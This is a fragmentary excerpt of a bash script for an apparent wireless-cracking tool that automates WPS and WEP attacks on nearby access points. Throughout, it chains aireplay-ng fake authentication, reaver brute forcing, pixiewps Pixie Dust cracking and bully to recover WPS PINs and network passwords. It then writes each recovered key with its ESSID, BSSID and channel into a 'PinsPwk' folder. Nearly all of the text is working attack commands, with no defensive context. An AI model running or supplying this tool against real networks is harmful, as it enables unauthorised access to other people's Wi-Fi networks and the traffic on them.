...
HT_FOLDER="wps-logs$(date "+%T" | tr -d ":")"
...
####################################################
 ...
 Desktop_PATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
####################################################
#--------------------------------------------------#
####################################################
...
arguments() {
						   ...
						   aireplay-ng -1 6000 -o 1 -q 10 -e "$ESSID" -a $BSSID -T 1 $mon | tee ${Temporary}/aireplay-ng_fakeauth.txt > /dev/null &

                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -N -d 15 -T .5 -r 3:15 -vvv -n -L -P -s ${Temporary}/empty.txt > ${Temporary}/Reaver.txt &
						   ReaverID=$!
						   disown $ReaverID
...
Try_Multi_PIN_REAVER() {
					...
					if [ "$Key" != "" ]
						then
							echo " [+] ESSID      >> $ESSID" >    ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo " [+] BSSID      >> $BSSID"   >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
							echo ""
...
WEP_function() {
						            ...
						            if [ "$Key_ASCII" != "" ]
						            	then
						            	    ...
						            	    echo " [+] ESSID      >> $ESSID" >            ${Desktop_PATH}/PinsPwk/${BSSID}.txt
									        echo " [+] BSSID      >> $BSSID" >>           ${Desktop_PATH}/PinsPwk/${BSSID}.txt
									        echo " [+] Privacy    >> $PRIVACY" >>    	  ${Desktop_PATH}/PinsPwk/${BSSID}.txt
									        echo " [+] Channel    >> $CHANNEL" >>    	  ${Desktop_PATH}/PinsPwk/${BSSID}.txt 
									        echo " [+] Hex Key    >> \"$Key_HEX\"" >>     ${Desktop_PATH}/PinsPwk/${BSSID}.txt 
									        echo " [+] ASCII Key  >> \"${Key_ASCII}\"" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
											echo " [+] Date       >> $cr_date" >>         ${Desktop_PATH}/PinsPwk/${BSSID}.txt
											echo ""
											echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
						     ...
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
		                           ...
		                           if [ $length -ge 17 ]; then
									    ...
									    BLUE_MAC=0
									    if [ $(cat ${Desktop_PATH}/PinsPwk/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/PinsPwk/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
											then
											    echo -e -n $BBlue"$MAC\t"
											    BLUE_MAC=1
...
CRACKING_PROCESS() {
                           Ver_Dir=`ls ${Desktop_PATH} | grep PinsPwk 2> /dev/null`
						   if [ "$Ver_Dir" == "" ];then
								mkdir ${Desktop_PATH}/PinsPwk
						   fi
						   Ver_p=`ls ${Desktop_PATH}/PinsPwk/ | grep ${BSSID} 2> /dev/null`
						   Ver_PIN=0
						   Ver_KEY=""
						   if [ "$Ver_p" != "" ]
								then
									Ver_PIN=`cat ${Desktop_PATH}/PinsPwk/$BSSID* | grep -i 'pin' | wc -l`
									Ver_KEY=`cat ${Desktop_PATH}/PinsPwk/$BSSID* | grep -i 'Key' | cut -d'"' -f2`
									Ver_WEP=`cat ${Desktop_PATH}/PinsPwk/$BSSID* | grep -i 'WEP'`
								else
								    Ver_PIN=0
						   fi
						   Cracking_Retry=0
						   ...
						   if [ "$Ver_p" != "" ] && [ $Ver_PIN -gt 0 ] || [ "$Ver_KEY" != "" ]
								then
								    ESSID_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 1p | cut -c20-`
                                    BSSID_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 2p | cut -c20-`
                                    if [ "$Ver_WEP" != "" ]
                                    	then
                                    		CHANNEL_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 4p | cut -c20-`
                                    		Key_Hex_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
                                    		Key_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 6p | awk -F\" '{print $2}'`
                                    else
                                    		CHANNEL_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 3p | cut -c20-`
                                    		PIN_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
                                    		Key_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
                                    		time_taken_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 6p | cut -c20-`
                                	fi
                                    cr_date_AC=`cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | sed -n 7p | cut -c20-`
									echo ""
									      ...
									      then
                                              if [ "$Ver_PIN" == "0" ]; then
                                              	  ...
                                              	  if [ "$Cracking_Retry" -lt 3 ]
                                              	  		then
                                                  			pixiewps -e $e -r $r -s $s -z $z -a $a -n $n -v 3 --start 10/2011 --end 11/2011 | tee ${Desktop_PATH}/PinsPwk/${BSSID}.txt > /dev/null &
                                                  			PID="$!"
                                                  			Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White"
                                                  else
                                                  			pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee ${Desktop_PATH}/PinsPwk/${BSSID}.txt > /dev/null &
                                                  			PID="$!"
                								  ...
                								  Loading
									              PIN=`less ${Desktop_PATH}/PinsPwk/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
									              time_taken=`less ${Desktop_PATH}/PinsPwk/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
									          	  fi
									          	  cr_date=`date`
									              if [ "$PIN" != "" ]
									                   then
															...
															if [ "$PIN_NUM" -ge "1" ]
																then
															     ...
															     then
											                         ...
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -B -A -C -S -N -R -F -p $PIN -e "$ESSID" $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
										                             PID="$!"
																	 ...
																	 echo ""
																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -L -N -d 15 -T .5 -r 3:15 -vv -p $PIN > ${Temporary}/Get_Pass.txt &
																	 PID="$!"
															...
															if [ "$ByPASS_Result" -eq "0" ]
																then
																	echo " [+] Time Taken >> $time_taken" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
																	echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/PinsPwk/${BSSID}.txt
																	echo ""
																	echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									                        		echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									               		...
									               		TIME2RE=`less ${Desktop_PATH}/PinsPwk/${BSSID}.txt | grep "Time" | awk '{print $4}'`
									               		if [[ "$TIME2RE" =~ ^[+-]?[0-9]+$ ]]
									               			then
									               				if [ "$TIME2RE" -lt "4" ] || [ "$Last" -eq "1" ]
									               					then
									               						cat ${Desktop_PATH}/PinsPwk/${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
									               						echo ""
												    					echo -e "$White        [${Red}!${White}] Sorry pin not found , good luck next time."
												    					echo ""
												    					rm -rf ${Desktop_PATH}/PinsPwk/${BSSID}.txt
												    			else
												    					echo ""
			...
			"3")
                  ...
                  if [ "$VerMon" != "" ]
                       then
						   ...
						   echo "" > ${Temporary}/empty.txt
                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -P -s  -L -N -d 15 -T .5 -r 3:15 ${Temporary}/empty.txt
						   echo ""						   
						   ...
						   if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
									      then
                                              trap kill_load SIGINT
                                              pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/PinsPwk/${BSSID}.txt > /dev/null &
                                              PID="$!"
                                              Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                              End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                                              Loading
						                                    ...
						                                    hash_bully="$?"
						   						            if [ $hash_bully -eq 0 ]
															     then
										                             ...
										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -A -C -S -N -R -B -F -p $PIN $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
										                             PID="$!"
										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
										                             Loading
                       ...
                       then
						   ...
						   if [ $hash_bully -eq 0 ]
								then
									...
									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
									echo ""
									bully -b $BSSID -c $CHANNEL -A -C -S -N -R -B -F -e "$ESSID" -p $PIN $mon
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
								else
									echo ""
									echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
									echo ""
									reaver -i $mon -b $BSSID -c $CHANNEL -L -N -d 15 -T .5 -r 3:15 -vv -e "$ESSID" -p $PIN
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
							fi
			  ...
			  "5")
                 ...
                 if [ "$VerMon" != "" ]
                      then
						   ...
						   Ver_Dir=`ls /tmp/wps-logs | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf ${Temporary}/capture
								mkdir ${Temporary}/capture
						   else
